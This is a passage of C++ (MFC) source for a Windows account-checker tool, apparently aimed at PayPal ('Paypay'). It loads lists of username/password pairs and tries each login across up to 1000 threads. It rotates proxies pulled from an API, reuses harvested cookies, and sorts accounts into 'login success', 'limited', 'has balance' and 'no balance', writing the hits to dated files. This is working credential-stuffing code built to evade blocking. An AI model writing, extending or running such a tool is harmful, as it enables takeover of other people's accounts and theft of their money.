	else
	{
		MessageBox(_T("打开失败"),NULL,MB_OK);
	}

}

bool is_break = true;
vector<string> g_save_data;
unsigned int g_proxy_index = 0;
int g_ok_account_num = 0;
int g_error_account_num = 0;
int g_other_account_num = 0;
int g_has_saomiao = 0;
int g_has_saomiao_used_time_num = 0;
int g_all_account_num = 0;
long g_begin_time = 0;
long g_has_run_time = 0;
long g_shengyu_time = 0;
vector<wstring> g_all_daili;
vector<wstring> g_all_daili_cache;
vector<wstring> g_use_daili;
vector<wstring> g_use_daili_from_file;
vector<wstring> g_unUsed_daili;
vector<wstring> g_unUsed_daili_cache;
vector<string> g_last_data;
wstring g_use_proxy_path;
int g_time_out;
bool g_use_daili_finish = false;
unsigned int g_thread_num;
unsigned int g_part_one;
unsigned int g_part_two;
HANDLE g_fun_handles[20][50];
HANDLE g_execute_handles[50][100];
bool g_use_auto_update = false;

int g_timer = 0;
int g_chongqi_time = 0;

std::map <std::string,std::string> g_all_name_password_temp;
bool g_can_insert = true;

void   ReStart(BOOL   bNormal)
{
	PROCESS_INFORMATION   info;
	STARTUPINFO startup;
	wchar_t szPath[128];
	wchar_t *szCmdLine;
	GetModuleFileName(AfxGetApp()-> m_hInstance,   szPath,   sizeof(szPath));
	szCmdLine   =   GetCommandLine();
	GetStartupInfo(&startup);
	BOOL   bSucc   =   CreateProcess(szPath,   L"chongqi",   NULL,   NULL,
		FALSE,   NORMAL_PRIORITY_CLASS,   NULL,   NULL,   &startup,   &info);
	if(bNormal   &&   bSucc)
	{
		CWnd *pWnd   =   AfxGetMainWnd();
		if(pWnd   !=   NULL)
		{
			pWnd-> PostMessage(WM_CLOSE,   0,   0);
		}
		else
			ExitProcess(-1);
	}
	else
		ExitProcess(-1);

}

wstring g_name[14] = {
	L"网络异常，可能是代理不能用，可能是网络连接失败",
	L"验证码识别失败",	    //验证码识别失败
	L"代理不可用",      //代理不可用
	L"登陆成功",   //登陆成功
	L"登陆成功 需要激活设备的账号",  //登陆成功 需要激活设备的账号
	L"登陆成功 受限的账号",  //登陆成功 受限的账号
	L"用户密码错误 登陆失败",      //用户密码错误 登陆失败
	L"未知状态，统计下最终结果",    //未知状态，统计下最终结果
	L"出现验证码 又没http代理也没验证码识别 那就直接pass这个账号了",//出现验证码 又没http代理也没验证码识别 那就直接pass这个账号了
	L"未知状态",     //账号状态位置
	L"有余额",
	L"没有余额",
	L"cookie不可用",
	L"无法登陆",
};
DWORD WINAPI execute(LPVOID lpParamter)
{
	CoInitialize(NULL);
	int type = 20;
	string name = "";
	string password = "";
	ProxyCookie pc;
	bool first = true;
	int error_proxy_count = 0;
	while(is_break) 
	{ 
		WaitForSingleObject(cookieMutex, INFINITE);
		if (CookieProcess::proxyCookieQueue.size() == 0)
		{
 			wstring mg = L"等待获取cookie";
			ReleaseMutex(cookieMutex);
			//((CPaypayDlg*)lpParamter)->m_list_box.InsertString(0,mg.c_str());
			continue;
		}
		ReleaseMutex(cookieMutex);
		WaitForSingleObject(hMutex, INFINITE);
		list<my_struct> *par = &((CPaypayDlg*)lpParamter)->m_all_name_password;
		list<my_struct>::iterator iter;
		if (par->size() > 0)
		{
				if (type != 0 && type != 1 && type != 2 && type != LOGIN_ERROR_COOKIE)
				{
					iter = par->begin();
					name = iter->name;
					password = iter->password;
					par->erase(iter);
				}
		}
		else if (type != 0 && type != 1 && type != 2 && type != LOGIN_ERROR_COOKIE)
		{
			ReleaseMutex(hMutex);
			break;
		}
		ReleaseMutex(hMutex);
		if (name != "")
		{

			wstring proxy;
			//WaitForSingleObject(hMutex, INFINITE);
			//if (g_useHTTP)
			//{
			//	proxy = g_all_daili[g_proxy_index];
			//	g_proxy_index++;
			//	if (g_proxy_index >= g_all_daili.size())
			//	{
			//		g_proxy_index = 0;
			//	}
			//}
			//else
			//{
			//    proxy = L"";
			//}
			//ReleaseMutex(hMutex);


			WaitForSingleObject(cookieMutex, INFINITE);
			if (CookieProcess::proxyCookieQueue.size() <=0 )
			{
				ReleaseMutex(cookieMutex);
				continue;
			}
			if (first)
			{
				first = false;
				pc = CookieProcess::proxyCookieQueue.front();
				CookieProcess::proxyCookieQueue.pop_front();
			}
			if (type == LOGIN_ERROR_COOKIE)
			{
				pc = CookieProcess::proxyCookieQueue.front();
				CookieProcess::proxyCookieQueue.pop_front();
			}
			
			ReleaseMutex(cookieMutex);
			wstring name_w = wstring(name.begin(),name.end());
			wstring password_w = wstring(password.begin(),password.end());
			wstring mg = L"扫描账号开始:" + name_w + L"       " + password_w;

			((CPaypayDlg*)lpParamter)->m_list_box.InsertString(0,mg.c_str());
			string returnstr = "";
			//_CrtMemState s1, s2, s3;
			//_CrtMemCheckpoint( &s1 );
			type = ((CPaypayDlg*)lpParamter)->Login2(UrlEncode(name), UrlEncode(password), pc.proxy,pc.cookie, returnstr);
			//_CrtMemCheckpoint( &s2 );
			//if(_CrtMemDifference( &s3, &s1, &s2))
			//	_CrtMemDumpStatistics( &s3 );
			WaitForSingleObject(hMutex, INFINITE);
			if (type == LOGIN_ERROR_SUCCESS || 
				type == LOGIN_ERROR_SUCCESS_ACTIVATE || 
				type == LOGIN_ERROR_SUCCESS_LIMIT || 
				type == LOGIN_ERROR_HASMONEY ||
				type == LOGIN_ERROR_CAN_NOT_LOGIN ||
				type == LOGIN_ERROR_NOMONEY)
			{
				g_ok_account_num++;
				char m[10];
				itoa(g_ok_account_num, m, 10);
				string efws = string(m);
				wstring text = wstring(efws.begin(),efws.end());
				((CPaypayDlg*)lpParamter)->SetDlgItemText(IDC_STATIC13,text.c_str());

			}
			else if (type == LOGIN_ERROR_COOKIE)
			{
				//WaitForSingleObject(cookieMutex, INFINITE);
				//if (CookieProcess::proxyCookieQueue.size() > 0)
				//{
				//	int i = CookieProcess::proxyCookieQueue.size();
				//	while (i > 0)
				//	{
				//		ProxyCookie fr = CookieProcess::proxyCookieQueue.front();
				//		if (fr.cookie == pc.cookie)
				//		{
				//			CookieProcess::proxyCookieQueue.pop_front();
				//		}
				//		else
				//		{
				//			CookieProcess::proxyCookieQueue.push_back(fr);
				//			CookieProcess::proxyCookieQueue.pop_front();
				//		}
				//		i--;
				//	}
				//
				//}
				//ReleaseMutex(cookieMutex);
			}
			else if (type == LOGIN_ERROR_FAIL)
			{
				g_error_account_num++;
				char m[10];
				itoa(g_error_account_num, m, 10);
				string efws = string(m);
				wstring text = wstring(efws.begin(),efws.end());
				((CPaypayDlg*)lpParamter)->SetDlgItemText(IDC_STATIC14,text.c_str());
			}
			else if (type == LOGIN_ERROR_UNKOWN || type == LOGIN_ERROR_PASS2)
			{
				g_other_account_num++;
				char m[10];
				itoa(g_other_account_num, m, 10);
				string efws = string(m);
				wstring text = wstring(efws.begin(),efws.end());
				((CPaypayDlg*)lpParamter)->SetDlgItemText(IDC_STATIC15,text.c_str());
			}
			if (type == LOGIN_ERROR_PASS2)//出现该类型将账号移到队列最后面
			{
				my_struct mmmk;
				mmmk.name = name;
				mmmk.password = password;
				((CPaypayDlg*)lpParamter)->m_all_name_password.push_back(mmmk);

			}
			if (type == LOGIN_ERROR_PROXY)
			{
				WaitForSingleObject(cookieMutex, INFINITE);
				error_proxy_count++;
				if (error_proxy_count > 10)
				{
					error_proxy_count = 0;
					if (CookieProcess::proxyCookieQueue.size() > 0)
					{
						pc = CookieProcess::proxyCookieQueue.front();
						CookieProcess::proxyCookieQueue.pop_front();
					}
				}
				//if (CookieProcess::proxyCookieQueue.size() > 0)
				//{
				//	int i = CookieProcess::proxyCookieQueue.size();
				//	ProxyCookie bak;
				//	bak.cookie = L""; bak.proxy = L"";
				//	while (i > 0)
				//	{
				//		ProxyCookie fr = CookieProcess::proxyCookieQueue.front();
				//		if (fr.cookie != pc.cookie)
				//		{
				//			CookieProcess::proxyCookieQueue.push_back(fr);
				//		}
				//		else
				//		{
				//			bak.cookie = fr.cookie; bak.proxy = fr.proxy;
				//		}
				//		CookieProcess::proxyCookieQueue.pop_front();
				//		i--;
				//	}
				//	if (bak.cookie != L"")
				//	{
				//		CookieProcess::proxyCookieQueue.push_back(bak);
				//	}	
				//}
				ReleaseMutex(cookieMutex);
				//CookieProcess::proxyCookieQueue.pop();
				vector<wstring>::iterator iter = find(g_unUsed_daili.begin(),g_unUsed_daili.end(),proxy);
				if (iter != g_unUsed_daili.end())
				{
				}
				else
				{
					g_unUsed_daili.push_back(proxy);

					TCHAR szFilePath[MAX_PATH + 1]={0};
					GetModuleFileName(NULL, szFilePath, MAX_PATH);
					(_tcsrchr(szFilePath, _T('\\')))[1] = 0;
					CString str_url = szFilePath; 
					wstring jmk = wstring(szFilePath) + wstring(L"unUsedDaili.txt");
					ofstream outfile(jmk,ios_base::app); 
					string dd = string(proxy.begin(),proxy.end()) + "\n";
					outfile<<dd;
					outfile.close(); 
				}

			}
			
			ReleaseMutex(hMutex);
			char m[10];
			itoa(type, m, 10);
			string efws = string(m);
			wstring jg = wstring(efws.begin(),efws.end());

			wstring ef = L"扫描账号结束:" + name_w + L"       " + password_w + L"  " +g_name[type] + L"  代理:" + proxy;
			((CPaypayDlg*)lpParamter)->m_list_box.InsertString(0,ef.c_str());
			//((CPaypayDlg*)lpParamter)->m_list_box.SetCurSel(((CPaypayDlg*)lpParamter)->m_list_box.GetCount());
			if (((CPaypayDlg*)lpParamter)->m_list_box.GetCount() > 1000)
			{
				((CPaypayDlg*)lpParamter)->m_list_box.ResetContent();
			}
			char t[10];
			itoa(type, t, 10);
			string kke = string(t);
			wstring etr = g_name[type];
			string data = name + "\t" + password;
			setlocale(LC_ALL, "chs");
			WaitForSingleObject(hMutex, INFINITE);
			if (type != 0 && type != 1 && type != 2 && type != LOGIN_ERROR_COOKIE)
			{
				g_has_saomiao++;
				g_has_saomiao_used_time_num++;
				g_last_data.push_back(data);
				CTime tm;
				tm = CTime::GetCurrentTime();
				CString dir_name;
				dir_name = tm.Format("%Y年%m月%d日");
				TCHAR szFilePath[MAX_PATH + 1]={0};
				GetModuleFileName(NULL, szFilePath, MAX_PATH);
				(_tcsrchr(szFilePath, _T('\\')))[1] = 0;
				if(!PathIsDirectory(szFilePath + dir_name))
				{
					CreateDirectory(szFilePath + dir_name,NULL);
				}
				CString str_url = szFilePath + dir_name + L"\\"; 
				g_use_proxy_path = wstring(str_url) + wstring(L"last_data_"+ etr + L".txt");
				ofstream outfile(g_use_proxy_path,ios_base::app); 
				string dd = string(data.begin(),data.end()) + "\n";
				outfile<<dd;
				outfile.close(); 

				//保存扫描过的所有账号
				wstring saved_path = wstring(szFilePath) + wstring(L"saved_cache.txt");
				ofstream outfile_save(saved_path, ios_base::app);
				outfile_save << (name + "            " + password + "\n");
				outfile_save.close();
				//((CPaypayDlg*)lpParamter)->m_progress.StepIt();
				((CPaypayDlg*)lpParamter)->m_progress.SetPos(g_has_saomiao);
				///
				char account_has_saomiao[25];     
				itoa(g_has_saomiao, account_has_saomiao,10);
				string s_account_has_saomiao = string(account_has_saomiao);
				wstring ws_account_has_saomiao = wstring(s_account_has_saomiao.begin(),s_account_has_saomiao.end());
				((CPaypayDlg*)lpParamter)->SetDlgItemText(IDC_STATIC17,ws_account_has_saomiao.c_str());

				g_has_run_time = GetTickCount() - g_begin_time;
				//计算时速
				int per_h = ((double)(60 * 60 * 1000)) / (double)g_has_run_time*(double) g_has_saomiao_used_time_num;

				//
				g_shengyu_time = ((double)g_all_account_num - (double)g_has_saomiao_used_time_num)/((double)g_has_saomiao_used_time_num/(double)g_has_run_time);
				CString str,str1;
				str1.Format(L"剩余 %d天",g_shengyu_time/(3600000 * 24));   
				str = str1;
				g_shengyu_time%=(3600000 * 24);   
				str1.Format(L"%d时",g_shengyu_time/3600000);   
				str += str1;    
				g_shengyu_time%=3600000;   
				str1.Format(L"%d分",g_shengyu_time/60000);   
				str += str1;   
				g_shengyu_time%=60000;   
				str1.Format(L"%d秒",g_shengyu_time/1000);
				str += str1;
				((CPaypayDlg*)lpParamter)->SetDlgItemText(IDC_STATIC21,str);
				CString pers;
				pers.Format(L"%d个",per_h);
				((CPaypayDlg*)lpParamter)->SetDlgItemText(IDC_STATIC25,pers);
			}
			ReleaseMutex(hMutex);

			

		}
		
	}
	CoUninitialize();
	return 0;
}

DWORD WINAPI waitExecute(LPVOID lpParamter)
{
	for(unsigned int i = 0; i < g_part_one;i++)
	{
		WaitForMultipleObjects(64, g_execute_handles[i], TRUE, INFINITE);
	}
	WaitForMultipleObjects(g_part_two, g_execute_handles[g_part_one], TRUE, INFINITE);
	int ee = GetLastError();
	for (unsigned int i = 0;i < g_part_one; ++i)
	{
		for (unsigned int j = 0;j < 64; ++j)
		{
			if (g_execute_handles[i][j] != 0)
			{
				CloseHandle(g_execute_handles[i][j]);
				g_execute_handles[i][j] = 0;
			}

		}
	}
	for (unsigned int i = 0 ; i < g_part_two; i++)
	{
		if (g_execute_handles[g_part_one][i] != 0)
		{
			CloseHandle(g_execute_handles[g_part_one][i]); 
			g_execute_handles[g_part_one][i] = 0;
		}

	}
	TCHAR szFilePath[MAX_PATH + 1]={0};
	GetModuleFileName(NULL, szFilePath, MAX_PATH);
	(_tcsrchr(szFilePath, _T('\\')))[1] = 0;
	CString str_url = szFilePath; 
	g_use_proxy_path = wstring(szFilePath);// + wstring(L"last_data.txt");
	//ofstream outfile(g_use_proxy_path,ios::out); 
	//for(unsigned int i = 0; i < g_last_data.size(); ++i)
	//{
	//	string dd = string(g_last_data[i].begin(),g_last_data[i].end()) + "\n";
	//	outfile<<dd;
	//}
	//outfile.close(); 
	wstring las = L"结果保存在" + g_use_proxy_path + L"下面";
	((CPaypayDlg*)lpParamter)->MessageBox(las.c_str(),NULL,MB_OK);
	((CPaypayDlg*)lpParamter)->GetDlgItem(IDC_BUTTON2)->EnableWindow(true);
	((CPaypayDlg*)lpParamter)->GetDlgItem(IDC_BUTTON3)->EnableWindow(true);
	((CPaypayDlg*)lpParamter)->m_list_box.ResetContent();
	if (g_has_saomiao == g_all_account_num )//全部扫描完后删除缓存账号
	{
		TCHAR szFilePath[MAX_PATH + 1]={0};
		GetModuleFileName(NULL, szFilePath, MAX_PATH);
		(_tcsrchr(szFilePath, _T('\\')))[1] = 0;
		wstring saved_path = wstring(szFilePath) + wstring(L"saved_cache.txt");
        DeleteFile(saved_path.c_str());
	}
	return 0;
}

bool is_daili_done = false;
bool CPaypayDlg::initDaiLi()
{
	if (g_useHTTP)
	{
		CString temp_time_out;
		GetDlgItemText(IDC_EDIT5,temp_time_out);
		if (temp_time_out == "")
		{
			MessageBox(_T("请输入超时时间"),NULL,MB_OK);
			is_daili_done = false;
			return false;
		}
		wstring ee_t = wstring( temp_time_out.GetString());
		string eee_t = string(ee_t.begin(),ee_t.end());
		int num_t = atoi(eee_t.c_str());
		if (num_t < 1 || num_t > 50)
		{
			MessageBox(_T("超时时间为1到50之间"),NULL,MB_OK);
			is_daili_done = false;
			return false;
		}
		g_time_out = num_t * 1000;
		char string_time[25];
		itoa(num_t, string_time,10);
		string ert_t = string(string_time);
		wstring mg_t = wstring(ert_t.begin(),ert_t.end());
		WritePrivateProfileString(L"pay",L"time_out",mg_t.c_str(),g_ini_file_path.c_str());

		CString str;
		m_daili_address.GetWindowText(str);
		if(str == "")
		{
			MessageBox(_T("请输入代理api地址!"),NULL,MB_OK);
			is_daili_done = false;
			return false;
		}
		WritePrivateProfileString(L"pay",L"daili_address",str.GetString(),g_ini_file_path.c_str());
		WinHttpClient WinClient(str.GetString());
		WinClient.SendHttpRequest(L"GET");
		string temp(WinClient.m_responseContent.begin(),WinClient.m_responseContent.end());
		stringstream ss(temp.c_str());
		WaitForSingleObject(hMutex, INFINITE);
		while(true)
		{
			string daili = "";
			ss>>daili;
			if (daili == "")
			{
				break;
			}
			if (daili == "errorCode=-9")
			{
				MessageBox(_T("该网站代理无效，请换其他网址试试"),NULL,MB_OK);
				is_daili_done = false;
				return false;
			}
			wstring proxy(daili.begin(),daili.end());
			g_all_daili.push_back(proxy);
		}
		ReleaseMutex(hMutex);
		//TCHAR szFilePath[MAX_PATH + 1]={0};
		//GetModuleFileName(NULL, szFilePath, MAX_PATH);
		//(_tcsrchr(szFilePath, _T('\\')))[1] = 0;
		//CString str_url = szFilePath; 
		//g_use_proxy_path = wstring(szFilePath) + wstring(L"can_use_proxy.txt");
		//ifstream file_stream(g_use_proxy_path);
		//char buffer[4096];
		//if (! file_stream.is_open())  
		//{ 
		//	MessageBox(_T("请先更新代理！"),NULL,MB_OK);
		//	return ;
		//}  
		//while (!file_stream.eof() )  
		//{  
		//	string proxy;
		//	file_stream.getline (buffer,100);  
		//	stringstream ss(buffer); 
		//	ss>>proxy;
		//	g_use_daili_from_file.push_back(wstring(proxy.begin(),proxy.end()));
		//} 
		WaitForSingleObject(hMutex, INFINITE);
		TCHAR szFilePath[MAX_PATH + 1]={0};
		GetModuleFileName(NULL, szFilePath, MAX_PATH);
		(_tcsrchr(szFilePath, _T('\\')))[1] = 0;
		CString str_url = szFilePath; 
		wstring mie = wstring(szFilePath) + wstring(L"unUsedDaili.txt");
		ifstream file_stream(mie);
		char buffer[4096];
		if (! file_stream.is_open())  
		{ 

		}  
		else
		{
			while (!file_stream.eof() )  
			{  
				string proxy;
				file_stream.getline (buffer,100);  
				stringstream ss(buffer); 
				ss>>proxy;
				g_unUsed_daili.push_back(wstring(proxy.begin(),proxy.end()));
			} 
		}
		vector<wstring>::iterator iter = g_unUsed_daili.begin();
		for(iter;iter != g_unUsed_daili.end();++iter)
		{
			wstring daili = *iter;
			vector<wstring>::iterator result = find(g_all_daili.begin(),g_all_daili.end(),daili);
			if (result != g_all_daili.end())
			{
				wstring me = L"剔除无用代理:" + (*result);
				m_list_box.InsertString(0,me.c_str());
				g_all_daili.erase(result);
			}
		}
		g_proxy_index = 0;
		ReleaseMutex(hMutex);

	}
	is_daili_done = true;
	return true;
}

DWORD WINAPI execute_daili(LPVOID lpParamter)
{
	hMutex = CreateMutex(NULL,FALSE,NULL);
	((CPaypayDlg*)lpParamter)->initDaiLi();
	if (!is_daili_done)
	{
		return 0;
	}
	
	//hMutex = CreateMutex(NULL, FALSE, NULL);
	CString temp_thread_num;
	((CPaypayDlg*)lpParamter)->m_thread_input_num.GetWindowText(temp_thread_num);
	if (temp_thread_num == "")
	{
		((CPaypayDlg*)lpParamter)->MessageBox(_T("请输入线程数量"),NULL,MB_OK);
		return 0;
	}
	wstring ee = wstring( temp_thread_num.GetString());
	string eee = string(ee.begin(),ee.end());
	int num = atoi(eee.c_str());
	if (num < 1 || num > 1000)
	{
		((CPaypayDlg*)lpParamter)->MessageBox(_T("线程数量应该为1到1000之间"),NULL,MB_OK);
		return 0;
	}  


	char string_num[25];     
	itoa(num, string_num,10);
	string ert = string(string_num);
	wstring mg = wstring(ert.begin(),ert.end());
	WritePrivateProfileString(L"pay",L"thread_num",mg.c_str(),g_ini_file_path.c_str());
	g_thread_num = num;
	CString input_file_path;
	((CPaypayDlg*)lpParamter)->m_input_file_path.GetWindowText(input_file_path);
	if (input_file_path == "")
	{
		((CPaypayDlg*)lpParamter)->MessageBox(_T("请选择账号文件!"),NULL,MB_OK);
		return 0;
	}
	//g_unUsed_daili.clear();
	is_break = true;
	CString filePathName;
	((CPaypayDlg*)lpParamter)->GetDlgItemText(IDC_EDIT2,filePathName);
	ifstream file_stream(filePathName.GetString());
	char buffer[40960];
	if (! file_stream.is_open())  
	{ 
		((CPaypayDlg*)lpParamter)->MessageBox(_T("打开账号文件失败"),NULL,MB_OK);
		return 0;
	}  
	((CPaypayDlg*)lpParamter)->GetDlgItem(IDC_BUTTON2)->EnableWindow(false);
	((CPaypayDlg*)lpParamter)->GetDlgItem(IDC_BUTTON3)->EnableWindow(true);
	((CPaypayDlg*)lpParamter)->m_list_box.ResetContent();
	((CPaypayDlg*)lpParamter)->m_cookieProcess.doPorxyCheck();
	((CPaypayDlg*)lpParamter)->m_cookieProcess_1.doPorxyCheck();
	while (!file_stream.eof() )  
	{  
		string name,password;
		file_stream.getline (buffer,40960);  
		stringstream ss(buffer); 
		ss>>name>>password;
		my_struct mmmk;
		mmmk.name = name;
		mmmk.password = password;
		((CPaypayDlg*)lpParamter)->m_all_name_password.push_back(mmmk);
		wstring text = L"读取账号数据:" + wstring(name.begin(),name.end());
		((CPaypayDlg*)lpParamter)->m_list_box.InsertString(0,text.c_str());
	} 
	((CPaypayDlg*)lpParamter)->m_progress.SetRange32(0,((CPaypayDlg*)lpParamter)->m_all_name_password.size());
	g_all_account_num = ((CPaypayDlg*)lpParamter)->m_all_name_password.size();
	char account_all_num[25];     
	itoa(((CPaypayDlg*)lpParamter)->m_all_name_password.size(), account_all_num,10);
	string s_account_all_num = string(account_all_num);
	wstring ws_account_all_num = wstring(s_account_all_num.begin(),s_account_all_num.end());
	((CPaypayDlg*)lpParamter)->SetDlgItemText(IDC_STATIC19,ws_account_all_num.c_str());
	//剔除扫描过的账号
	TCHAR szFilePath[MAX_PATH + 1] = { 0 };
	GetModuleFileName(NULL, szFilePath, MAX_PATH);
	(_tcsrchr(szFilePath, _T('\\')))[1] = 0;
	CString str_url = szFilePath;
	wstring saved_path = wstring(szFilePath) + wstring(L"saved_cache.txt");
	ifstream file_stream_save(saved_path);
	vector<my_struct> has_saomiao;
	if (!file_stream_save.is_open())
	{

	}
	else
	{
		while (!file_stream_save.eof())
		{
			string name, password;
			file_stream_save.getline(buffer, 100);
			stringstream ss(buffer);
			ss >> name>>password;
			my_struct mmk;
			mmk.name = name;
			mmk.password = password;
			if (mmk.name != "")
			{
				has_saomiao.push_back(mmk);
			}
		}
		vector<my_struct>::iterator iter = has_saomiao.begin();
		for ( ;iter != has_saomiao.end(); ++iter)
		{
			list<my_struct>::iterator result = find(((CPaypayDlg*)lpParamter)->m_all_name_password.begin(), ((CPaypayDlg*)lpParamter)->m_all_name_password.end(), *iter);
			if( result != ((CPaypayDlg*)lpParamter)->m_all_name_password.end())
			{
				wstring me_name = wstring(result->name.begin(), result->name.end());
				wstring me_password = wstring(result->password.begin(), result->password.end());
		 		wstring me = L"剔除扫描过的账号:" + me_name + L"     " + me_password;
				((CPaypayDlg*)lpParamter)->m_list_box.InsertString(0, me.c_str());
				((CPaypayDlg*)lpParamter)->m_all_name_password.erase(result);
			}
		}
		//vector<my_struct>::iterator iter = ((CPaypayDlg*)lpParamter)->m_all_name_password.begin();
		//for (iter; iter != ((CPaypayDlg*)lpParamter)->m_all_name_password.end();)
		//{
		//	my_struct ss = *iter;
		//	wstring find_name = wstring(ss.name.begin(), ss.name.end());
		//	vector<wstring>::iterator result = find(has_saomiao.begin(), has_saomiao.end(), find_name);
		//	if (result != has_saomiao.end())
		//	{
		//		wstring me_name = wstring(ss.name.begin(), ss.name.end());
		//		wstring me = L"剔除扫描过的账号:" + me_name;
		//		((CPaypayDlg*)lpParamter)->m_list_box.InsertString(0, me.c_str());
		//		((CPaypayDlg*)lpParamter)->m_all_name_password.erase(iter++);
		//	}
		//	else
		//	{
		//		++iter;
		//	}
		//}

	}
	
	g_has_saomiao = has_saomiao.size();
	g_has_saomiao_used_time_num = 0;
	((CPaypayDlg*)lpParamter)->m_progress.SetPos(has_saomiao.size());
	char account_has_saomiao[25];     
	itoa(has_saomiao.size(), account_has_saomiao,10);
	string s_account_has_saomiao = string(account_has_saomiao);
	wstring ws_account_has_saomiao = wstring(s_account_has_saomiao.begin(),s_account_has_saomiao.end());
	((CPaypayDlg*)lpParamter)->SetDlgItemText(IDC_STATIC17,ws_account_has_saomiao.c_str());
	//
	g_part_one = num/64;
	g_part_two = num%64;
	((CPaypayDlg*)lpParamter)->m_list_box.InsertString(0,L"创建线程中...");
	for (unsigned int i = 0;i < g_part_one; ++i)
	{
		for (unsigned int j = 0;j < 64; ++j)
		{
			g_execute_handles[i][j] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execute, (LPVOID)(lpParamter), 0, NULL);
		}
	}
	for (unsigned int i = 0 ; i < g_part_two; i++)
	{
		g_execute_handles[g_part_one][i] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execute, (LPVOID)(lpParamter), 0, NULL);
	}

	HANDLE handle = CreateThread(NULL, 0, waitExecute, (LPVOID)lpParamter, 0, NULL);
	if (g_use_auto_update)
	{
		((CPaypayDlg*)lpParamter)->SetTimer(1,1000,NULL);
	}
	if (g_used_chongqi)
	{
		((CPaypayDlg*)lpParamter)->SetTimer(3,1000,NULL);
	}
	return 0;
}

void CPaypayDlg::OnBnClickedButton2()
{
	// TODO: 在此添加控件通知处理程序代码
	SetTimer(10,60000,NULL);
	HANDLE hSignalThread = CreateThread(NULL, 0, execute_daili, (LPVOID)this, 0, NULL);
	g_begin_time = GetTickCount();
	//if (!initDaiLi())
	//{
	//	return ;
	//}
	//hMutex = CreateMutex(NULL, FALSE, NULL);
	//CString temp_thread_num;
	//m_thread_input_num.GetWindowText(temp_thread_num);
	//if (temp_thread_num == "")
	//{
	//	MessageBox(_T("请输入线程数量"),NULL,MB_OK);
	//	return ;
	//}
	//wstring ee = wstring( temp_thread_num.GetString());
	//string eee = string(ee.begin(),ee.end());
	//int num = atoi(eee.c_str());
	//if (num < 1 || num > 500)
	//{
	//	MessageBox(_T("线程数量应该为1到500之间"),NULL,MB_OK);
	//	return ;
	//}  
	//
	//
	//char string_num[25];     
	//itoa(num, string_num,10);
	//string ert = string(string_num);
	//wstring mg = wstring(ert.begin(),ert.end());
	//WritePrivateProfileString(L"pay",L"thread_num",mg.c_str(),g_ini_file_path.c_str());
	//g_thread_num = num;
	//CString input_file_path;
	//m_input_file_path.GetWindowText(input_file_path);
	//if (input_file_path == "")
	//{
	//	MessageBox(_T("请选择账号文件!"),NULL,MB_OK);
	//	return ;
	//}
	//g_unUsed_daili.clear();
	//is_break = true;
	//CString filePathName;
	//GetDlgItemText(IDC_EDIT2,filePathName);
	//ifstream file_stream(filePathName.GetString());
	//char buffer[4096];
	//if (! file_stream.is_open())  
	//{ 
	//	MessageBox(_T("打开账号文件失败"),NULL,MB_OK);
	//	return ;
	//}  
	//GetDlgItem(IDC_BUTTON2)->EnableWindow(false);
	//GetDlgItem(IDC_BUTTON3)->EnableWindow(true);
	//m_list_box.ResetContent();
	//m_list_box.InsertString(0,L"创建线程中...");
	//while (!file_stream.eof() )  
	//{  
	//	string name,password;
	//	file_stream.getline (buffer,100);  
	//	stringstream ss(buffer); 
	//	ss>>name>>password;
	//	my_struct mmmk;
	//	mmmk.name = name;
	//	mmmk.passwrod = password;
	//	m_all_name_password.push_back(mmmk);
	//} 
	//g_part_one = num/64;
	//g_part_two = num%64;
	//
	//for (unsigned int i = 0;i < g_part_one; ++i)
	//{
	//	for (unsigned int j = 0;j < 64; ++j)
	//	{
	//		g_execute_handles[i][j] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execute, (LPVOID)(this), 0, NULL);
	//	}
	//}
	//for (unsigned int i = 0 ; i < g_part_two; i++)
	//{
	//	g_execute_handles[g_part_one][i] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execute, (LPVOID)(this), 0, NULL);
	//}
	//
	//HANDLE handle = CreateThread(NULL, 0, waitExecute, (LPVOID)this, 0, NULL);

}


void CPaypayDlg::OnBnClickedCheck1()
{

	// TODO: 在此添加控件通知处理程序代码
	if ( BST_CHECKED == IsDlgButtonChecked( IDC_CHECK1 ) )
	{
		g_useHTTP = true;
	}
	else
	{
		g_useHTTP = false;
	}
	if (g_useHTTP)
	{
		WritePrivateProfileString(L"pay",L"daili",L"1",g_ini_file_path.c_str());
	}
	else
	{
		WritePrivateProfileString(L"pay",L"daili",L"0",g_ini_file_path.c_str());
	}
}


bool fun_break = true;
int g_all_daili_num = 0;
HANDLE fun_hMutex;
//DWORD WINAPI fun(LPVOID lpParamter)
//{
//		while(fun_break)
//		{
//			
//			CString str;
//			CPaypayDlg* par = (CPaypayDlg*)lpParamter;
//			par->m_daili_address.GetWindowText(str);
//			WinHttpClient WinClient(L"http://www.baidu.com");
//			WaitForSingleObject(hMutex, INFINITE);
//			wstring proxy = L"";
//			g_proxy_index = 0;
//			g_all_daili.clear();
//			if (g_all_daili.size() > 0)
//			{
//				vector<wstring>::iterator iter = g_all_daili.begin();
//				proxy = *iter;
//				WinClient.SetProxy(proxy);
//				g_all_daili.erase(iter);
//			}
//			else
//			{
//                 fun_break = false;
//			}
//			ReleaseMutex(hMutex);
//			int nn = WinClient.SendHttpRequest(L"GET");
//			if (((int)WinClient.m_responseHeader.find(L"200 OK\r\n"))>0)
//			{
//				WaitForSingleObject(fun_hMutex, INFINITE);
//				if (proxy != L"")
//				{
//					g_use_daili.push_back(proxy);
//				}
//				
//				ReleaseMutex(fun_hMutex);
//			}
//			char m[10];
//			itoa(g_all_daili_num, m, 10);
//			string efws = string(m);
//			wstring jg = wstring(efws.begin(),efws.end());
//			itoa(g_all_daili.size(), m, 10);
//			efws = string(m);
//			wstring kg = wstring(efws.begin(),efws.end());
//			itoa(g_use_daili.size(), m, 10);
//			efws = string(m);
//			wstring jgk = wstring(efws.begin(),efws.end());
//			wstring etyg = L"代理总数量:" + jg + L"\n"+ L"剩余扫描数量:" + kg + L"\n"+ L"可用数量:" + jgk;
//			((CPaypayDlg*)lpParamter)->GetDlgItem(IDC_STATIC_7)->SetWindowText(etyg.c_str());
//		}
//	return 0;
//}

DWORD WINAPI waitProxy(LPVOID lpParamter)
{
	for(unsigned int i = 0;i < 5;++i)
	{
		WaitForMultipleObjects(10, g_fun_handles[i], TRUE, INFINITE);
	}
	for(unsigned int i = 0;i < 5;++i)
		for(unsigned int j = 0;j < 50; ++j)
		{
			if (g_fun_handles[i][j] != 0)
			{
				CloseHandle(g_fun_handles[i][j]);
				g_fun_handles[i][j] = 0;
			}

		}
